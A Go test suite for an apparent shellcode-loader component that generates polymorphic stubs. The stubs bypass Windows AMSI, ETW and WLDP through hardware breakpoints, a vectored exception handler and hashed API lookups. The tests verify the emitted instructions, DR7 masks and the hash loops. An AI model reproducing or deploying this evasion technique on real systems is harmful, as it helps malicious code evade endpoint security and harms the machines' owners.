package donut

import (
	"errors"
	"strconv"
	"strings"
	"testing"

	"golang.org/x/arch/x86/x86asm"
)

// disassembleAll64 decodes buf from start with x86asm and fails the test on
// any decode gap or trailing garbage. Returns the instruction list.
func disassembleAll64(t *testing.T, buf []byte, base uint64) []x86asm.Inst {
	t.Helper()
	var insns []x86asm.Inst
	off := 0
	for off < len(buf) {
		inst, err := x86asm.Decode(buf[off:], 64)
		if err != nil || inst.Len == 0 {
			t.Fatalf("decode failure at offset %d (0x%x): err=%v bytes=% x",
				off, off, err, buf[off:min(off+8, len(buf))])
		}
		insns = append(insns, inst)
		off += inst.Len
	}
	if off != len(buf) {
		t.Fatalf("decoded %d bytes, buffer is %d", off, len(buf))
	}
	return insns
}

// mustFindInsn asserts an instruction with the given mnemonic and canonical
// operand text exists; operands are matched by substring for readability.
func mustFindInsn(t *testing.T, insns []x86asm.Inst, mnem string, opPart string) x86asm.Inst {
	t.Helper()
	for _, in := range insns {
		if !strings.EqualFold(in.Op.String(), mnem) {
			continue
		}
		if strings.Contains(gnu(in), opPart) {
			return in
		}
	}
	t.Fatalf("instruction %s …%q not found in stream", mnem, opPart)
	return x86asm.Inst{}
}

func TestGenerateEvadeStub64_Decodes(t *testing.T) {
	for i := 0; i < 25; i++ {
		stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatalf("iter %d: %v", i, err)
		}
		if len(stub) == 0 || meta.Size != len(stub) {
			t.Fatalf("iter %d: size mismatch %d vs %d", i, meta.Size, len(stub))
		}
		insns := disassembleAll64(t, stub, 0x400000)
		if len(insns) < 40 {
			t.Fatalf("iter %d: suspiciously short stream (%d insns)", i, len(insns))
		}
	}
}

func TestGenerateEvadeStub64_KeyContractInstructions(t *testing.T) {
	stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	insns := disassembleAll64(t, stub, 0x400000)

	found := false
	for _, in := range insns {
		if strings.EqualFold(in.Op.String(), "push") && strings.Contains(gnu(in), "rcx") {
			found = true
		}
	}
	if !found {
		t.Fatal("prologue does not save rcx (instance pointer)")
	}

	found = false
	for _, in := range insns {
		if strings.EqualFold(in.Op.String(), "mov") && strings.Contains(gnu(in), "gs") && strings.Contains(gnu(in), "0x60") {
			found = true
		}
	}
	if !found {
		t.Fatal("no gs:[0x60] PEB access found")
	}

	found = false
	for _, in := range insns {
		if strings.EqualFold(in.Op.String(), "mov") && strings.Contains(gnu(in), "rcx") && strings.Contains(gnu(in), "-0x2") {
			found = true
		}
	}
	if !found {
		t.Fatal("no mov rcx, -2 pseudo-handle found")
	}

	found = false
	for _, in := range insns {
		if strings.EqualFold(in.Op.String(), "mov") && strings.Contains(gnu(in), "0x100010") {
			found = true
		}
	}
	if !found {
		t.Fatal("CONTEXT_DEBUG_REGISTERS flag not written")
	}

	handlerBytes := stub[meta.HandlerOffset:]
	hInsns := disassembleAll64(t, handlerBytes, 0x500000)
	found = false
	for _, in := range hInsns {
		if strings.EqualFold(in.Op.String(), "cmp") && strings.Contains(gnu(in), "0x7ffffffc") {
			found = true
		}
	}
	if !found {
		t.Fatal("handler does not check EXCEPTION_SINGLE_STEP")
	}

	foundNeg, foundZero := false, false
	for _, in := range hInsns {
		if strings.EqualFold(in.Op.String(), "mov") && strings.Contains(gnu(in), "eax") && strings.Contains(gnu(in), "-0x1") {
			foundNeg = true
		}
		if strings.EqualFold(in.Op.String(), "xor") && strings.Contains(gnu(in), "eax") {
			foundZero = true
		}
	}
	if !foundNeg || !foundZero {
		t.Fatalf("handler return paths incomplete: continue=%v pass=%v", foundNeg, foundZero)
	}
}

func TestGenerateEvadeStub64_Uniqueness(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 30; i++ {
		stub, _, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatal(err)
		}
		seen[string(stub[:min(256, len(stub))])] = true
	}
	if len(seen) < 20 {
		t.Fatalf("only %d distinct prefixes over 30 builds — morph knobs too weak", len(seen))
	}
}

func TestEvadeHashMirror(t *testing.T) {
	// The Go mirror must be injective enough across the names we resolve.
	names := []string{
		"AmsiScanBuffer", "AmsiScanString", "NtTraceEvent",
		"WldpIsClassInApprovedList", "LoadLibraryA", "GetThreadContext",
		"SetThreadContext", "RtlAddVectoredExceptionHandler",
	}
	for _, fam := range []evadeHashFamily{hashDJB, hashFNV, hashROL} {
		for _, seed := range []uint32{1, 0x9E3779B9, 0xDEADBEEF} {
			seen := map[uint32]string{}
			for _, n := range names {
				h := evadeHashASCII(n, fam, seed)
				if prev, dup := seen[h]; dup {
					t.Fatalf("export hash collision %s/%s fam=%d seed=%#x", prev, n, fam, seed)
				}
				seen[h] = n
			}
			mods := []string{"ntdll.dll", "kernel32.dll", "amsi.dll", "wldp.dll"}
			seenM := map[uint32]string{}
			for _, m := range mods {
				h := evadeHashWide(toLowerASCII(m), fam, seed)
				if prev, dup := seenM[h]; dup {
					t.Fatalf("module hash collision %s/%s fam=%d seed=%#x", prev, m, fam, seed)
				}
				seenM[h] = m
			}
		}
	}
}

func TestPatchEvadeJmp(t *testing.T) {
	stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true})
	if err != nil {
		t.Fatal(err)
	}
	// simulate the stub placed at offset 0 followed by a next stage at len(stub)
	if err := PatchEvadeJmp(stub, meta, len(stub)); err != nil {
		t.Fatal(err)
	}
	disp := int32(uint32(stub[meta.JmpOffset]) | uint32(stub[meta.JmpOffset+1])<<8 |
		uint32(stub[meta.JmpOffset+2])<<16 | uint32(stub[meta.JmpOffset+3])<<24)
	// The main jmp sits before the fail-trampoline and VEH handler, so the
	// displacement to a next stage placed at buffer end is positive and equals
	// exactly the size of the trailing region.
	want := int32(len(stub) - (meta.JmpOffset + 4))
	if disp != want || disp <= 0 {
		t.Fatalf("jmp displacement = %d, want %d (skip fail-region+handler)", disp, want)
	}
}

func gnu(in x86asm.Inst) string {
	return x86asm.GNUSyntax(in, 0, nil)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// TestEmittedHashLoopsMatchGoMirror is the F1 regression killer: it decodes
// every emitted hash loop (seed load `mov r15d, imm32` … `cmp r15d, imm32`)
// with x86asm, interprets the exact instruction vocabulary against candidate
// inputs, and asserts the computed accumulator equals one of the Go-mirror
// constants. Byte-presence pins validated a wrong operand direction for days
// (`44 01 FA` decoded as edx+=r15d); this simulation executes semantics.
func TestEmittedHashLoopsMatchGoMirror(t *testing.T) {
	for iter := 0; iter < 6; iter++ {
		stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatal(err)
		}
		insns := disassembleAll64(t, stub[:meta.HandlerOffset], 0x400000)

		mods := []string{"ntdll.dll", "kernel32.dll", "amsi.dll", "wldp.dll"}
		apis := []string{"LoadLibraryA", "GetThreadContext", "SetThreadContext",
			"RtlAddVectoredExceptionHandler", "AmsiScanBuffer", "AmsiScanString",
			"NtTraceEvent", "WldpIsClassInApprovedList"}
		allWants := map[uint32]bool{}
		for _, m := range mods {
			allWants[evadeHashWide(toLowerASCII(m), meta.Family, meta.Seed)] = true
		}
		for _, a := range apis {
			allWants[evadeHashASCII(a, meta.Family, meta.Seed)] = true
		}

		loops := 0
		for i := 0; i < len(insns); i++ {
			s := gnu(insns[i])
			if !strings.Contains(s, "mov") || !strings.Contains(s, "%r15d") {
				continue
			}
			seed, ok := extractImm32(s)
			if !ok || seed != meta.Seed {
				continue
			}
			flavor := ""
			for j := i + 1; j < i+13 && j < len(insns); j++ {
				sj := gnu(insns[j])
				if strings.Contains(sj, "$0x41") && strings.Contains(sj, "%dl") {
					flavor = "tolower"
					break
				}
				if strings.Contains(sj, "test") && strings.Contains(sj, "%dl") {
					flavor = "exact"
					break
				}
			}
			if flavor == "" {
				continue
			}
			simSeed = seed
			if !simulateHashLoop(t, insns, i+1, flavor, allWants) {
				t.Fatalf("iter %d loop at insn %d (%s): simulation failed", iter, i, flavor)
			}
			loops++
		}
		if loops < 4 {
			t.Fatalf("iter %d: only %d hash loops simulated (expect >=4)", iter, loops)
		}
	}
}

// simulateHashLoop extracts the loop body (after the seed load, up to the
// backward jmp), iterates it per input byte, then checks the accumulator
// against the emitted constant set. Linear disassembly shows the body once;
// the machine executes it N times — the simulation must do the same.
var simSeed uint32

func simulateHashLoop(t *testing.T, insns []x86asm.Inst, start int, flavor string, allWants map[uint32]bool) bool {
	_ = t
	t.Helper()
	var inputs [][]byte
	if flavor == "tolower" {
		for _, m := range []string{"ntdll.dll", "kernel32.dll", "amsi.dll", "wldp.dll", "clr.dll", "shell32.dll"} {
			inputs = append(inputs, utf16leBytes(toLowerASCII(m))) // exactly Length bytes
		}
	} else {
		for _, a := range []string{"LoadLibraryA", "GetThreadContext", "SetThreadContext",
			"RtlAddVectoredExceptionHandler", "AmsiScanBuffer", "AmsiScanString",
			"NtTraceEvent", "WldpIsClassInApprovedList"} {
			inputs = append(inputs, []byte(a+"\x00"))
		}
	}

	bodyEnd := -1
	for pc := start; pc < len(insns) && pc < start+40; pc++ {
		if strings.EqualFold(insns[pc].Op.String(), "jmp") {
			bodyEnd = pc
			break
		}
	}
	if bodyEnd < 0 {
		return false
	}
	body := insns[start:bodyEnd]

	for _, input := range inputs {
		acc := simSeed // the seed load precedes the extracted body
		dl := byte(0)
		idx := 0
		done := false
		for !done && idx <= len(input) {
			for _, in := range body {
				s := gnu(in)
				switch {
				case strings.Contains(s, "mov") && strings.Contains(s, "%r15d"):
					if v, ok := extractImm32(s); ok {
						acc = v
					}
				case strings.Contains(s, "movzbl"):
					if idx < len(input) {
						dl = input[idx]
					} else {
						dl = 0
					}
				case strings.Contains(s, "add") && strings.Contains(s, "$0x20") && strings.Contains(s, "%dl"):
					if dl >= 'A' && dl <= 'Z' {
						dl += 0x20
					}
				case strings.Contains(s, "test") && strings.Contains(s, "%dl"):
					if dl == 0 {
						done = true
					}
				case strings.Contains(s, "test") && strings.Contains(s, "r14"):
					if idx >= len(input) {
						done = true
					}
				case strings.Contains(s, "imul") && strings.Contains(s, "%r15d"):
					if v, ok := extractImm32(s); ok {
						acc *= v
					}
				case strings.Contains(s, "xor") && strings.Contains(s, "%edx") && strings.Contains(s, "%r15d"):
					acc ^= uint32(dl)
				case strings.Contains(s, "add") && strings.Contains(s, "%edx,%r15d"):
					acc += uint32(dl)
				case strings.Contains(s, "rol") && strings.Contains(s, "%r15d"):
					acc = acc<<13 | acc>>19
				case strings.Contains(s, "inc") && strings.Contains(s, "%r13"):
					idx++
				}
				if done {
					break
				}
			}
		}
		for pc := bodyEnd + 1; pc < len(insns) && pc < bodyEnd+8; pc++ {
			s := gnu(insns[pc])
			if strings.Contains(s, "cmp") && strings.Contains(s, "%r15d") {
				if allWants[acc] {
					return true
				}
				break
			}
			if strings.Contains(s, "imul") || strings.Contains(s, "xor") || strings.Contains(s, "%edx,%r15d") {
				return false
			}
		}
	}
	return false
}

func utf16leBytes(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, c := range []byte(s) {
		out = append(out, c, 0)
	}
	return out
}

// extractImm32 parses a GNU-syntax immediate (`$0x…` or signed `$-0x…`),
// cutting at the operand separator.
func extractImm32(s string) (uint32, bool) {
	pos := strings.LastIndex(s, "$0x")
	neg := false
	if pos < 0 {
		pos = strings.LastIndex(s, "$-0x")
		if pos < 0 {
			return 0, false
		}
		neg = true
	}
	hex := s[pos+3:]
	if neg {
		hex = s[pos+4:]
	}
	if end := strings.IndexAny(hex, ",% )]"); end >= 0 {
		hex = hex[:end]
	}
	v, err := strconv.ParseUint(hex, 16, 64)
	if err != nil {
		return 0, false
	}
	if neg {
		return uint32(-int64(v)), true
	}
	return uint32(v), true
}

// TestExportNameLoadSIBScale pins the name-table indexing scale by DECODING
// the emitted bytes — run-7 proved a scale ×2 encoding (SIB 0x49) passes every
// presence test while faulting at runtime: AddressOfNames entries are DWORDs
// and require scale ×4 (SIB 10_001_001 = 0x89). Scale encoding: 00=×1 01=×2
// 10=×4 11=×8.
func TestExportNameLoadSIBScale(t *testing.T) {
	for i := 0; i < 8; i++ {
		stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatal(err)
		}
		insns := disassembleAll64(t, stub[:meta.HandlerOffset], 0x400000)
		for _, in := range insns {
			s := gnu(in)
			// the name-RVA load: r13d destination, indexed by rcx
			if strings.Contains(s, "mov") && strings.Contains(s, "r13d") && strings.Contains(s, ",%rcx,") {
				if !strings.Contains(s, ",%rcx,4)") {
					t.Fatalf("name-table load not at scale 4: %q (SIB scale regression)", s)
				}
			}
		}
	}
}

// TestEvadeTargetsMasking — WP1-lite: the target mask must reach the stub
// generators (no wldp/etw machinery when deselected) and the zero value must
// remain fully armed for backward compatibility.
func TestEvadeTargetsMasking(t *testing.T) {
	full := EvadeTargets(0).options()
	if !full.Amsi || !full.Etw || !full.Wldp {
		t.Fatalf("zero mask did not default to all: %+v", full)
	}
	amsiOnly := EvadeAmsi.options()
	if !amsiOnly.Amsi || amsiOnly.Etw || amsiOnly.Wldp {
		t.Fatalf("amsi-only mask leaked etw/wldp: %+v", amsiOnly)
	}

	stub, meta, err := GenerateEvadeStub64(amsiOnly)
	if err != nil {
		t.Fatal(err)
	}
	h := stub[meta.HandlerOffset:]
	fullStub, fullMeta, err := GenerateEvadeStub64(full)
	if err != nil {
		t.Fatal(err)
	}
	if len(h) >= len(fullStub[fullMeta.HandlerOffset:]) {
		t.Fatalf("amsi-only handler (%d bytes) not smaller than full (%d bytes)",
			len(h), len(fullStub[fullMeta.HandlerOffset:]))
	}
	disassembleAll64(t, stub[:meta.HandlerOffset], 0x400000)
	disassembleAll64(t, h, 0x500000)
}

func TestEvadeFamilyCombinations(t *testing.T) {
	tests := []struct {
		name string
		opts EvadeOptions
		want map[evadeHandling]int
	}{
		{"amsi", EvadeOptions{Amsi: true}, map[evadeHandling]int{hcAmsiScan: 2}},
		{"etw", EvadeOptions{Etw: true}, map[evadeHandling]int{hcEtwVoid: 1}},
		{"wldp", EvadeOptions{Wldp: true}, map[evadeHandling]int{hcWldp: 1}},
		{"amsi-etw", EvadeOptions{Amsi: true, Etw: true}, map[evadeHandling]int{hcAmsiScan: 2, hcEtwVoid: 1}},
		{"amsi-wldp", EvadeOptions{Amsi: true, Wldp: true}, map[evadeHandling]int{hcAmsiScan: 2, hcWldp: 1}},
		{"etw-wldp", EvadeOptions{Etw: true, Wldp: true}, map[evadeHandling]int{hcEtwVoid: 1, hcWldp: 1}},
		{"all", EvadeOptions{Amsi: true, Etw: true, Wldp: true}, map[evadeHandling]int{hcAmsiScan: 2, hcEtwVoid: 1, hcWldp: 1}},
	}

	generators := []struct {
		name string
		gen  func(EvadeOptions) ([]byte, EvadeMetadata, error)
	}{
		{"x64", GenerateEvadeStub64},
		{"x86", GenerateEvadeStub32},
	}

	for _, gen := range generators {
		for _, tt := range tests {
			t.Run(gen.name+"/"+tt.name, func(t *testing.T) {
				stub, meta, err := gen.gen(tt.opts)
				if err != nil {
					t.Fatal(err)
				}
				wantSlots := 0
				for _, count := range tt.want {
					wantSlots += count
				}
				if meta.SlotCount != wantSlots {
					t.Fatalf("SlotCount=%d want %d", meta.SlotCount, wantSlots)
				}
				got := map[evadeHandling]int{}
				for _, handling := range meta.SlotHandling {
					if handling != 0xff {
						got[handling]++
					}
				}
				for handling, count := range tt.want {
					if got[handling] != count {
						t.Fatalf("handling %d count=%d want %d (all=%v)", handling, got[handling], count, got)
					}
				}
				if len(got) != len(tt.want) {
					t.Fatalf("handling classes=%v want %v", got, tt.want)
				}
				wantLoads := 0
				if tt.opts.Amsi {
					wantLoads++
				}
				if tt.opts.Wldp {
					wantLoads++
				}
				if gen.name == "x64" {
					insns := disassembleAll64(t, stub, 0x400000)
					assertEmittedDR7(t, insns, true, wantSlots)
					assertLoadLibraryCallCount(t, insns, true, wantLoads)
				} else {
					insns := disassembleAll32(t, stub, 0x400000)
					assertEmittedDR7(t, insns, false, wantSlots)
					assertLoadLibraryCallCount(t, insns, false, wantLoads)
				}
			})
		}
	}
}

func assertEmittedDR7(t *testing.T, insns []x86asm.Inst, x64 bool, slotCount int) {
	t.Helper()
	want := uint32(0)
	for slot := 0; slot < slotCount; slot++ {
		want |= 1 << uint(2*slot)
	}
	base, disp := x86asm.EDI, int64(ctx32Dr7)
	if x64 {
		base, disp = x86asm.RSP, int64(evCtx+ctx64Dr7)
	}
	for _, in := range insns {
		if !strings.EqualFold(in.Op.String(), "mov") {
			continue
		}
		mem, memOK := in.Args[0].(x86asm.Mem)
		imm, immOK := in.Args[1].(x86asm.Imm)
		if memOK && immOK && mem.Base == base && mem.Disp == disp {
			if got := uint32(imm); got != want {
				t.Fatalf("DR7 mask=%#x want %#x for %d slots", got, want, slotCount)
			}
			return
		}
	}
	t.Fatalf("DR7 write not found for %d slots", slotCount)
}

func assertLoadLibraryCallCount(t *testing.T, insns []x86asm.Inst, x64 bool, want int) {
	t.Helper()
	base, disp := x86asm.EBP, int64(-ev32LoadLib)
	if x64 {
		base, disp = x86asm.RSP, int64(evLoadLib)
	}
	got := 0
	for _, in := range insns {
		if !strings.EqualFold(in.Op.String(), "call") {
			continue
		}
		mem, ok := in.Args[0].(x86asm.Mem)
		if ok && mem.Base == base && mem.Disp == disp {
			got++
		}
	}
	if got != want {
		t.Fatalf("LoadLibraryA call count=%d want %d", got, want)
	}
}

func TestEvadeRejectsEmptyAndUnknownTargets(t *testing.T) {
	for _, gen := range []struct {
		name string
		gen  func(EvadeOptions) ([]byte, EvadeMetadata, error)
	}{
		{"x64", GenerateEvadeStub64},
		{"x86", GenerateEvadeStub32},
	} {
		t.Run(gen.name+"/empty", func(t *testing.T) {
			if _, _, err := gen.gen(EvadeOptions{}); err == nil {
				t.Fatal("empty target set accepted")
			}
		})
		t.Run(gen.name+"/unknown-mask", func(t *testing.T) {
			if _, _, err := gen.gen(EvadeTargets(0x80).options()); err == nil {
				t.Fatal("unknown EvadeTargets bit accepted")
			}
		})
	}
}

type evadeFailAfterReader struct {
	remaining int
	consumed  int
}

func (r *evadeFailAfterReader) Read(p []byte) (int, error) {
	if r.remaining == 0 {
		return 0, errRandomSourceFailure
	}
	n := len(p)
	if n > r.remaining {
		n = r.remaining
	}
	for i := 0; i < n; i++ {
		p[i] = 0xff
	}
	r.remaining -= n
	r.consumed += n
	if n != len(p) {
		return n, errRandomSourceFailure
	}
	return n, nil
}

func TestEvadeHandlerRotationRNGFailurePropagates(t *testing.T) {
	const bytesBeforeHandlerRotation = 8 + 4 + 3*8 + 2*2*8
	for _, gen := range []struct {
		name string
		gen  func(EvadeOptions) ([]byte, EvadeMetadata, error)
	}{
		{"x64", GenerateEvadeStub64},
		{"x86", GenerateEvadeStub32},
	} {
		t.Run(gen.name, func(t *testing.T) {
			r := &evadeFailAfterReader{remaining: bytesBeforeHandlerRotation}
			replaceRandomReader(t, r)
			_, _, err := gen.gen(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
			if !errors.Is(err, errRandomSourceFailure) {
				t.Fatalf("error=%v want injected handler-rotation RNG failure", err)
			}
			if r.consumed != bytesBeforeHandlerRotation {
				t.Fatalf("consumed=%d want %d before handler draw", r.consumed, bytesBeforeHandlerRotation)
			}
		})
	}
}

func TestGenerateEvadeStub64_SetupCallsFailClosed(t *testing.T) {
	stub, meta, err := GenerateEvadeStub64(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	insns := disassembleAll64(t, stub[:meta.HandlerOffset], 0x400000)
	wantChecks := map[string]int{
		"0x20(%rsp)": 2, // LoadLibraryA for amsi.dll and wldp.dll
		"0x28(%rsp)": 1, // GetThreadContext
		"0x30(%rsp)": 1, // SetThreadContext
		"0x38(%rsp)": 1, // RtlAddVectoredExceptionHandler
	}
	seen := map[string]int{}
	addVEH, setTC := -1, -1
	for i, in := range insns {
		if !strings.EqualFold(in.Op.String(), "call") {
			continue
		}
		s := gnu(in)
		for operand := range wantChecks {
			if !strings.Contains(s, operand) {
				continue
			}
			seen[operand]++
			if i+2 >= len(insns) || !strings.EqualFold(insns[i+1].Op.String(), "test") || !strings.EqualFold(insns[i+2].Op.String(), "je") {
				t.Fatalf("setup call %q at instruction %d is not immediately guarded by test/je: %q / %q",
					s, i, gnu(insns[i+1]), gnu(insns[i+2]))
			}
			if operand == "0x38(%rsp)" {
				addVEH = i
			}
			if operand == "0x30(%rsp)" {
				setTC = i
			}
		}
	}
	for operand, want := range wantChecks {
		if seen[operand] != want {
			t.Fatalf("guarded calls through %s=%d want %d", operand, seen[operand], want)
		}
	}
	if addVEH < 0 || setTC < 0 || addVEH >= setTC {
		t.Fatalf("VEH-first ordering violated: AddVEH=%d SetThreadContext=%d", addVEH, setTC)
	}
}
